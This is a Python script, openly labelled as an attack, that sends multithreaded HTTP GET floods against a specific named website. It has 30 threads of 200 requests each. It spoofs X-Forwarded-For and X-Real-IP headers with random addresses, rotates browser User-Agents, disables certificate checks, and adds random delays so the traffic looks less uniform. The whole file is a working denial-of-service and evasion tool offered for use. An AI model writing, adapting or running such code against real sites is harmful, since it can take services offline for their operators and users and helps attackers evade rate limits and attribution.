#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import random
import time
import threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ----------------------------------------------------------------------
# Helper functions – generate realistic‑looking request headers
# ----------------------------------------------------------------------
def random_user_agent():
    """Return a randomly chosen browser User‑Agent."""
    uas = [
        # Chrome
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        # Firefox
        "Mozilla/5.0 (Windows NT 10.0; rv:123.0) Gecko/20100101 Firefox/123.0",
        # Edge
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        # Safari (macOS)
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    ]
    return random.choice(uas)

def random_ip():
    """Generate a random IPv4 address for X‑Forwarded‑For / X‑Real‑IP."""
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# ----------------------------------------------------------------------
# Configuration
# ----------------------------------------------------------------------
TARGET_URL            = "https://www.nokormc.site"   # <-- put the target URL here
THREAD_COUNT          = 30                              # number of concurrent threads
REQUESTS_PER_THREAD   = 200                             # how many requests each thread sends
DELAY_RANGE_SECONDS   = (0.1, 0.5)                      # random pause between requests (seconds)

# ----------------------------------------------------------------------
# Attack worker – runs in each thread
# ----------------------------------------------------------------------
def attack_worker(thread_id):
    sess = requests.Session()
    sess.verify = False                     # ignore TLS certificate errors

    for i in range(REQUESTS_PER_THREAD):
        headers = {
            "User-Agent": random_user_agent(),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Forwarded-For": random_ip(),
            "X-Real-IP": random_ip(),
            "Referer": TARGET_URL,
        }

        try:
            resp = sess.get(TARGET_URL,
                            headers=headers,
                            timeout=10,
                            allow_redirects=False)
            print(f"[Thread-{thread_id}] #{i+1} → {resp.status_code}")
        except requests.RequestException as e:
            print(f"[Thread-{thread_id}] #{i+1} ✗ {e}")

        # Random short sleep to make traffic look less uniform
        time.sleep(random.uniform(*DELAY_RANGE_SECONDS))

# ----------------------------------------------------------------------
# Launch threads
# ----------------------------------------------------------------------
if __name__ == "__main__":
    print(f"Starting attack on {TARGET_URL} with {THREAD_COUNT} threads")
    threads = []

    for t_id in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker, args=(t_id,))
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("Attack complete")
